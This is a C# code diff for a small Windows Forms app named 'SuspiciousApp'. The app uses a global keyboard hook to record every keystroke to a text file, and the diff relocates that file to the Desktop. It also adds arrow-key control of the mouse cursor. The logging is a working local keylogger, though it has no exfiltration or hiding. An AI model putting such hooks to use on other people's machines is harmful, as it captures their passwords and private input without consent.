@@ -19,6 +19,7 @@ namespace MyKeyhook
         Boolean f4 = false;
         globalKeyboardHook logAllKeysHook;
         globalKeyboardHook checkShortcut;
+        globalKeyboardHook moveMouse;
 
 
         public SuspiciousApp()
@@ -27,6 +28,7 @@ namespace MyKeyhook
             logAllKeysHook = new globalKeyboardHook();
             logAllKeysHook.unhook();
             checkShortcut = new globalKeyboardHook();
+            moveMouse = new globalKeyboardHook();
         }
 
         private void Form1_Load(object sender, EventArgs e)
@@ -81,12 +83,19 @@ namespace MyKeyhook
             checkShortcut.HookedKeys.Add(Keys.F4);
             checkShortcut.KeyDown += new KeyEventHandler(checkShortcut_down);
             checkShortcut.KeyUp += new KeyEventHandler(checkShortcut_up);
+
+            //init mouse move
+            moveMouse.HookedKeys.Add(Keys.Up);
+            moveMouse.HookedKeys.Add(Keys.Left);
+            moveMouse.HookedKeys.Add(Keys.Right);
+            moveMouse.HookedKeys.Add(Keys.Down);
+            moveMouse.KeyDown += new KeyEventHandler(moveMouse_keydown);
         }
 
         void logAll_keyUp(object sender, KeyEventArgs e)
         {
             
-            using (StreamWriter writetext = new StreamWriter("loggedkeys.txt", true))
+            using (StreamWriter writetext = new StreamWriter(Environment.GetFolderPath(System.Environment.SpecialFolder.DesktopDirectory)+"\\loggedkeys.txt", true))
             {
                 writetext.WriteLine("Pressed\t" + e.KeyCode.ToString() + "\n");
             }
@@ -132,6 +141,33 @@ namespace MyKeyhook
                 logAllKeysHook.unhook();
                 loggingKeys = false;
             }
+        }
+
+        void moveMouse_keydown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Up)
+            {
+                MoveCursor(0, 20);
+            }
+            if (e.KeyCode == Keys.Down)
+            {
+                MoveCursor(0, -20);
+            }
+            if (e.KeyCode == Keys.Left)
+            {
+                MoveCursor(20, 0);
+            }
+            if (e.KeyCode == Keys.Right)
+            {
+                MoveCursor(-20, 0);
+            }
+        }
+
+        private void MoveCursor(int x, int y)
+        {
+            Cursor = new Cursor(Cursor.Current.Handle);
+            Cursor.Position = new Point(Cursor.Position.X - x, Cursor.Position.Y - y);
+
         }
     }
 }
